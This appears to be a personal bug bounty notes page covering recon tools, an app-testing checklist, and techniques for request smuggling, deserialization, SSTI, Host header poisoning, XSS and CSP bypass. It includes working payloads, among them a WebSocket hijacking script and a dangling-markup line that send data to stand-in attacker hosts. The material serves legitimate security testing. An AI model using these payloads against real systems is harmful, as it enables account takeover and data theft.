---
layout: page
title: Bug Bounty Tips
permalink: /info
comments: false
---

<div class="row justify-content-between">
<div class="col-md-8 pr-5">

<p>Test Page</p>

</div>

<div class="col-md-4">

<div class="sticky-top sticky-top-80">
<h5>Buy me a coffee</h5>

<p>Thank you for your support!</p>

<a target="_blank" href="https://buymeacoffee.com/rosehacksls" class="btn btn-danger">Buy me a coffee</a>

</div>
</div>
</div>

## Navigation

- [Methodology](#methodology)
- [Application Checklist](#app-checklist)
- [Top Vulns](#top-vulns)
- [Testing Vulns](#testing-vulns)
- [References](#resources)

---

## Recon

#### Core Objectives:
- **Identify all subdomains!**
- **Identify all open ports!**

---

#### 1. Information Gathering:
   - **Target Details:** Collect comprehensive data on the target, including potential acquisitions.
   - **Tool:** [Crunchbase](https://www.crunchbase.com) can be used to identify acquisitions related to the target.

#### 2. ASN Identification:
   - **Manual Method:** Utilize [BGP HE](http://bgp.he.net) to find Autonomous System Numbers (ASNs).
   - **Automated Tools:**
     - **Metabigor:** An efficient tool for ASN reconnaissance.
     - **ASNLookup:** A straightforward ASN lookup utility.
     - **Amass Intel:** Use with `asn` flag for detailed ASN information (`amass intel -asn [ASN_NUMBER]`).

#### 3. Root Domain Discovery:
   - **Reverse WHOIS:** Automate using DOMLink for domain linking based on WHOIS data.
   - **Ad/Analytics Relationships:** Explore relationships using [BuiltWith](https://builtwith.com) for Ad and Analytics identifiers.
   - **Google Dorks:** Utilize advanced Google search operators to find target domains.
   - **Shodan:** Employ Shodan for uncovering exposed services linked to your target.

#### 4. Subdomain Enumeration

##### a. Linked and JS Discovery:
   - **Objective:** Identify all links and embedded JavaScript within client-side code.
   - **Tool:** 
     - **Burp Suite Pro:** Grab useful extensions for passive discovery: JS Miner. Conduct manual review as well.

#### 5. Automation Tasks:

- **Cron Jobs:**
  - **Weekly:** Run `Subfinder` - **Completed!**
  - **Weekly:** Run `Nuclei` - **Completed!**
- **script**
  - Used to check and report on program updates.

##### b. Subdomain Scraping:
   - **Infrastructure Sources:** Gather data from sources like Censys, DnsDumpster, and WaybackMachine.
   - **Certificate Sources:** Explore SSL certificate registries like crt.sh, CertDB, and Cert Spotter.
   - **Search Engines:** Utilize Google, Yahoo, and Baidu for domain discovery.
   - **Security Databases:** Leverage databases like VirusTotal, Rapid7 Project Sonar, and SecurityTrails.

   - **Tools:**
     - **Amass and Subfinder:** Powerful tools for ASN enumeration and subdomain discovery. Need API keys for more results.
     - **GitHub Subdomain Scraping:** Use a script to scrape GitHub for subdomains.
     - **Shodan Parser:** Use a Shodan parer to obtain all results from Shodan.
     - **Cloud Range Monitoring:** Monitor SSL sites within AWS, GCP, and Azure ranges. Parse certificates to match with your target using tools like `tls.bufferover.run`.

##### c. Subdomain Bruteforcing:
   - **Tools:**
     - **Amass:** Command: `amass enum -brute -d [DOMAIN] -rf`
     - **ShuffleDNS:** A massDNS wrapper for effective subdomain brute-forcing.
     - **Wordlists:**
       - **Tailored Wordlists:** Generate using TomNomNom and CeWL.
       - **Massive Wordlists:** Use comprehensive lists like JHaddix's `all.txt`.
     - **Commonspeak2:** Source wordlists from GitHub.
     - **Subdomain Alterations:** Experiment with variations like `www.target.com` to `ww2.target.com`.

#### 6. Port Scanning and Analysis:
   - **Masscan:** Quickly identify open ports (requires an IP list).
   - **dnMasscan:** Resolves domain names to IP addresses and passes them to Masscan.
   - **Nmap:** Perform a detailed analysis of discovered open ports.

#### 7. GitHub Dorking:
   - **Objectives:**
     - Identify endpoints and subdomains.
     - Create custom wordlists based on discovered technologies.
     - Leverage naming conventions and patterns to discover hidden assets.
     - Use job postings to infer the technology stack.
   - **Search Tips:**
     - Filter by scripting languages using `language:python language:bash`.
     - Focus on recently submitted repositories.
     - Exclude unnecessary results using `NOT` keyword.
     - Identify users who may not be directly mapped to the organization by exploring dotfiles and LinkedIn profiles.

#### 8. HTTPx and GoWitness:
   - Use **HTTPx** to find live hosts and maybe **Gowitness** (HTTPx can do both) to capture screenshots for visual inspection.

#### 9. Subdomain Takeover:
   - **Resources:**
     - **Can-I-Take-Over-XYZ:** Database by EdOverflow listing subdomain takeover techniques.
     - **SubOver:** Tool to check for vulnerable subdomains.
     - **Nuclei:** Run templates to check for takeover vulnerabilities.


[Back to top](#resources)

---

## App Checklist - Getting Started

1. What technology stack and programming languages are used in the application?
2. What type of server or hosting environment is powering the application?
3. Is there a Web Application Firewall (WAF) in place?
4. What third-party libraries and frameworks are integrated? Are there known vulnerabilities associated with these?
5. What authentication mechanisms are implemented?
7. What objects or data structures are utilized within the application?
8. How are sessions created, maintained, and managed?
9. Are there any useful comments or metadata within the code?
10. How does the application handle special characters or input encoding?
11. Can specific actions or inputs trigger error messages or stack traces?
12. What common features or functionalities are included in the application?
13. How is a user uniquely identified and tracked?
14. Are there different user roles or permission levels within the application?
15. Does the application expose or utilize an API?
16. Is a Content Management System (CMS) integrated into the application?
17. Is a Content Security Policy (CSP) in place to mitigate cross-site scripting attacks?
18. Is Cross-Origin Resource Sharing (CORS) implemented, and how is it configured?
19. Is CAPTCHA or another bot detection mechanism used?
20. Are WebSockets or similar technologies employed for real-time communication?
21. Is the source code or any part of it publicly accessible?
[Back to top](#resources)

---

## Testing Vulns

Note: Add notes from OneNote
#### HTTP Request Smuggling

**Step 1:** Begin by right-clicking on the Fully Qualified Domain Name (FQDN) and selecting the "Smuggle Probe" option.  
**Step 2:** If the tool identifies a vulnerability, left-click on the "Issue" to delve deeper. Navigate to the "Request 1" tab and select either CL.TE or TE.CL, depending on the specific payload requirements.  
(If the vulnerability is detected across multiple directories, expand the paths and ensure you select the correct one.)  
**Step 3:** Adjust the prefix to match the necessary payload criteria.  
**Step 4:** Launch the attack.

#### De-serialization

##### Black-Box Testing

**Step 1:** Determine the programming language in which the application is written. Understand how data serialization is handled in that specific language.
   - **PHP:** Serialized objects often look like `O:4:"User":2:{s:4:"name";s:6:"carlos";s:10:"isLoggedIn";b:1;}`.
   - **Java:** Serialized objects typically begin with "ac ed" in hexadecimal or "rO0" in Base64.
   - **Ruby:** Analyze for Ruby-specific serialization patterns (e.g., Marshal.dump).

**Step 2:** Identify serialized data that can be manipulated via user input.  
**Step 3:** Choose the most effective attack strategy:
   1. Directly edit the object in its byte stream form.
   2. Write a script in the relevant language to create and serialize an object yourself.
   3. Utilize existing tools:
      - **PHP:** Use `PHPGCC` to generate payloads.  
        Example: `./phpgcc [PAYLOAD] [PARAMETERS] | base64 -w 0 | xclip -selection clipboard`.  
        Insert the encoded payload and the secret key into `sha1-hmac-generator.php`.
      - **Java:** Employ `ysoserial` to generate payloads, ensuring that the entire payload is URL encoded when sending through a vulnerable cookie.
      - **Ruby:** Implement tools specifically designed for Ruby serialization attacks.

##### White-Box Testing

**Step 1:** Analyze the source code for functions that indicate serialization processes:
   - **PHP:** Look for `serialize()` and `unserialize()` functions.
   - **Java:** Search for `java.io.Serializable`, `readObject()`, and `InputStream` usage.

#### Prototype Pollution

**Step 1:** Identify potential vulnerabilities using targeted payloads or automated scanners.  
**Step 2:** Look for vulnerable gadgets that can be exploited:
   - **Fingerprint.js:** Utilize resources such as [this gist](https://gist.github.com/nikitastupin/b3b64a9f8c0eb74ce37626860193eaec) for reference.
   - **Wappalyzer** or **BuiltWith:** These tools can help identify the frameworks and libraries in use.

**Step 3:** If no vulnerable gadgets are found, inspect the Dev Tools Console for any alerts flagged by the Untrusted-Types plugin.

#### Server-Side Template Injection (SSTI)

**Step 1:** Confirm the presence of a template injection vulnerability:
   - If reflected input does not lead to an XSS vulnerability (no output, encoded tags, or error messages), attempt to exploit it using the template syntax (e.g., `http://vulnerable.com/?greeting=data.username}}<tag>`).
     - If there’s no visible change, the page might either not be vulnerable or you could be using the wrong template syntax.
   - Develop a custom BurpBounty template to identify mathematical operations in the response (e.g., `http://vulnerable.com?greeting=${7*7}` and check for '49' in the response).

**Step 2:** Identify the template engine using resources like the [Template Engine Decision Tree](https://portswigger.net/web-security/images/template-decision-tree.png).  
**Step 3:** Exploit the vulnerability using the appropriate syntax and payload.

#### WebSockets

- **Interception:** WebSocket messages can be intercepted and manipulated in Burp Suite, similar to HTTP/HTTPS requests.
- **Configuration:** Set the WebSocket to either Client-to-Server or Server-to-Client mode in the Options tab.

**Manipulating the WebSocket Handshake:**
   - **Why:** Expanding the attack surface is crucial; attackers may close the established connection or exploit token expiration.
   - **Steps:**
     1. In Burp Repeater, click the "Pencil Icon" next to the WebSocket URL.
     2. Choose to clone or reconnect.
     3. Modify the connection details as needed.
     4. Click "Connect" to initiate the handshake.

**Identifying Design Flaws:**
   - Misplaced trust in HTTP security headers.
   - Flaws in session handling mechanisms.
   - Expanded attack surface through custom HTTP headers.

**Cross-Site WebSocket Hijacking (CSWSH):**
   - Identify WebSocket handshakes lacking CSRF protection or unpredictable tokens.
   - Sessions should rely on cookies, similar to CSRF vulnerabilities.
   - **Example of a Malicious Application:**
     ```javascript
     websocket = new WebSocket('wss://your-websocket-URL')
     websocket.onopen = start
     websocket.onmessage = handleReply

     function start(event) {
         websocket.send("READY");
     }

     function handleReply(event) {
         fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
     }
     ```

#### HTTP Host Header Attacks

##### Overview

When multiple applications are hosted on a single IP address, it is typically due to one of two setups:

1. **Virtual Hosting (VHosting):**
   - A single IP address hosts multiple applications, which may be owned by a single entity or multiple owners. This is common in SaaS environments.

2. **Traffic Routed through an Intermediary:**
   - Applications are hosted on back-end servers, with traffic routed through load balancers or reverse proxy servers. This setup is frequently used when accessing applications via a Content Delivery Network (CDN).

##### How a Browser Handles HTTP Requests:

1. **DNS Resolution:** The browser sends the URL to a DNS server, which returns the associated IP address.
2. **HTTP Request:** The browser sends an HTTP request to the IP address, including the Host header in the request.
3. **Routing:** The web server uses the Host header to route the request to the appropriate application on the server.

##### Potential Vulnerabilities:

Exploiting the Host header can lead to several security issues, including:

- **Web Cache Poisoning:** Manipulating the Host header can poison the cache, serving malicious content to other users.
- **Business Logic Flaws:** Altering the Host header might interfere with application logic, leading to unintended behavior.
- **Server-Side Request Forgery (SSRF):** Malicious actors can manipulate the Host header to initiate unauthorized requests to internal systems.
- **Client-Side Vulnerabilities:** Host header attacks can also lead to client-side issues like Cross-Site Scripting (XSS), SQL Injection (SQLi), and HTML Injection (HTMLi).

#### Testing for HTTP Host Header Attacks

### Step 1: Identify Vulnerable Applications

- **Manipulate the Host Header:** Supply an arbitrary domain name in the Host header and observe the response.
  - If the application is accessible with the arbitrary domain name, it suggests that the server defaults to your target application when an unrecognized domain name is provided. This indicates potential vulnerabilities.
  - **Alternative Responses:** 
    - If the server responds with "Invalid Host header," it may be protected against basic Host header manipulation.
    - If security controls block the request, try adding non-numeric ports or manipulating the header to bypass the controls (e.g., SSRF attempts).

- **Duplicate Host Headers:** Test the server's handling of duplicate Host headers.
  - Example:
    ```
    GET /example HTTP/1.1
    Host: vulnerable-website.com
    Host: bad-stuff-here
    ```

- **Absolute URLs in Request Line:** Include the full URL in the request line.
  - Example:
    ```
    GET https://vulnerable-website.com/ HTTP/1.1
    Host: bad-stuff-here
    ```

- **Spacing Bypasses:** Insert spaces or other characters to bypass validation filters.
  - Example (note the space before the first Host header):
    ```
    GET /example HTTP/1.1
     Host: bad-stuff-here
    Host: vulnerable-website.com
    ```

- **Combine with HTTP Request Smuggling:** Explore whether Host header manipulation can be combined with HTTP Request Smuggling techniques to exploit the target further.

- **Alternative Headers:** If standard Host header manipulation doesn't work, try using other headers commonly employed in place of the Host header, such as:
  - `X-Forwarded-Host`
  - `X-Host`
  - `X-Forwarded-Server`
  - `X-HTTP-Host-Override`
  - `Forwarded`

  Burp Suite's Param Miner extension can be used to guess additional headers that might be susceptible to similar attacks.

### Step 2: Exploit Vulnerable Applications

**Password Reset Poisoning:**

- **Objective:** Trick the vulnerable application into sending a password reset link to a domain controlled by the attacker.
- **Process:**
  1. Obtain the victim’s email or username needed to initiate a password reset.
  2. Submit the password reset form, setting the Host header to the attacker's domain.
  3. The victim receives a password reset email with the poisoned URL.
  4. The victim clicks the link, sending the reset token to the attacker's server.
  5. The attacker visits the legitimate URL and uses the stolen token to reset the victim's password.

  **Note:** If you cannot manipulate the reset link, consider using HTML injection to modify the email itself and add the attacker’s domain.

- **Other Potential Exploits:** Depending on the configuration and response of the application, additional attack vectors may be identified, including SSRF and other forms of input manipulation.

#### Advanced Cross-Site Scripting (XSS)

##### Overview

Cross-Site Scripting (XSS) is a widespread vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts can steal data, manipulate content, or redirect users to malicious sites.

For more details on XSS attacks, refer to the [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).

##### Types of XSS

1. **Reflected XSS:** The malicious script is immediately reflected back in the HTTP response, often via query parameters.
2. **Stored XSS:** The script is stored in the application’s database and executed when retrieved, affecting all users who access the stored data.
3. **DOM-based XSS:** The vulnerability resides in the client-side code, where user input is processed in a way that leads to execution of malicious scripts.

###### DOM-based XSS

###### Sources and Sinks

**Common Sources:** These are locations where user-controlled data can enter the DOM:
- `window.location` (URL)
- `location.search`
- `location.hash`
- `document.URL`
- `document.documentURI`
- `document.URLUnencoded`
- `document.baseURI`
- `location`
- `document.cookie`
- `document.referrer`
- `window.name`
- `history.pushState`
- `history.replaceState`
- `localStorage`
- `sessionStorage`
- `IndexedDB`
- `Database`

**Common Sinks:** These are locations where the data is inserted into the DOM or executed:
- `document.write()` — Allows for direct script injection within `<script>` tags.
- `document.writeln()`
- `document.domain`
- `someDOMElement.innerHTML` — Commonly used with `<img>` or `<iframe>` tags.
- `someDOMElement.outerHTML`
- `someDOMElement.insertAdjacentHTML`
- `someDOMElement.onevent`
- `add()`, `after()`, `append()`, `animate()`
- `attr()` — Can manipulate attributes such as `href` to execute scripts.
- `insertAfter()`, `insertBefore()`, `before()`
- `html()`, `prepend()`, `replaceAll()`, `replaceWith()`
- `wrap()`, `wrapInner()`, `wrapAll()`
- `has()`, `constructor()`, `init()`, `index()`
- `jQuery.parseHTML()`, `$.parseHTML()`

###### Testing for DOM-based XSS Sinks

**HTML Sinks:**  
These are generally easier to identify and exploit.
1. Pass an MD5 sum through the source to track the data flow.
2. Search for the MD5 sum in the HTML using browser Dev Tools (`Ctrl + F`).
3. Refine the payload until the attack successfully executes.

**JavaScript Execution Sinks:**  
These require more in-depth analysis.
1. Search the JavaScript code for references to user-controlled sources (`Ctrl + Shift + F`).
2. Set breakpoints and follow the flow of data manually to see how it’s being used.
3. Trace variables back to their sources and examine how they interact with the sinks.
4. Hover over variables in the Dev Tools to inspect their values before they reach the sink.
5. Craft and refine your payload to execute the attack.

###### Special Cases

**Angular XSS:**
- Look for the `"ng-app"` attribute in the HTML.
- Any JavaScript enclosed within HTML tags labeled `ng-app` will automatically be executed by Angular.
  - Example Payload: `{{$on.constructor('alert(1)')()}}`

**XSS via JSON Evaluation:**
- Exploit the JavaScript `eval()` method when it processes JSON objects.
  - Example Payload: `\"-alert(1)}//`

###### XSS Contexts

**Between HTML Tags:**
- Example: `<p>[USER CONTROLLED INPUT]</p>`
  - To trigger JavaScript execution, attackers need to inject new HTML tags.
  - **Steps to Exploit:**
    1. Use fuzzing techniques to identify which HTML tags are filtered by the Web Application Firewall (WAF).
    2. Test for attributes or events that are filtered.
    3. Experiment with different payloads to bypass WAF protections.
    4. Construct a working payload based on the allowed tags, attributes, and events.

###### Bypassing Content Security Policy (CSP)

###### Common CSP Controls

**Content-Security-Policy Header:**
- `script-src 'self'` — Restricts script loading to the same origin.
- `script-src https://scripts.normal-website.com` — Only allows scripts from a specified domain.

**Nonce (random value):**
- A nonce is required in the script tag for execution.
- It must be securely generated each time the page loads and should not be guessable.

**Hash (hash value of script being loaded):**
- Scripts are hashed, and the hash is compared to ensure the script hasn't been altered.

### CSP Bypass Techniques

**Image Tags:**
- Most CSPs don’t block `<img>` tags, which can be leveraged in attacks.

**Dangling Markup Injection:**
- Inject HTML tags with open attribute quotes to exfiltrate sensitive data, such as CSRF tokens, to an attacker-controlled server.

**Steps:**
1. Identify the name of the input field to exploit.
2. Add a corresponding GET parameter in the URL.
3. Use the malicious parameter's value as the payload.

**Important Considerations:**
- Always send the request through Burp Repeater and use "Show Response in Browser" to verify the behavior.
- Single vs. double quotes are crucial in this context; a double quote will close on the next double quote and vice versa.
  - Example:
    ```
    <input type="text" name="input" value="[PAYLOAD]"/>
    [PAYLOAD] = "><img src='//attacker-website.com?"
    ```
    Resulting HTML:
    ```
    <input type="text" name="input" value=""><img src='//attacker-website.com?[SENSITIVE DATA]"/>
    ```

#### AWS S3 Bucket Enumeration

##### Identifying Open S3 Buckets

**Step 1:** Locate any open S3 buckets that could be publicly accessible.

**Step 2:** Search for files within these buckets that might contain sensitive information:
- `sql`
- `sql.gz`
- `backup.zip`
- `backup.gz`
- `backup.tar`
- `backup.tar.gz`
- Any other potentially valuable files.

**Tool:** Use `S3Scanner` for automated bucket enumeration and analysis.

[Back to top](#resources)

---

## References

[OWASP Top 10](https://owasp.org/www-project-top-ten/)

[Back to top](#resources)

---
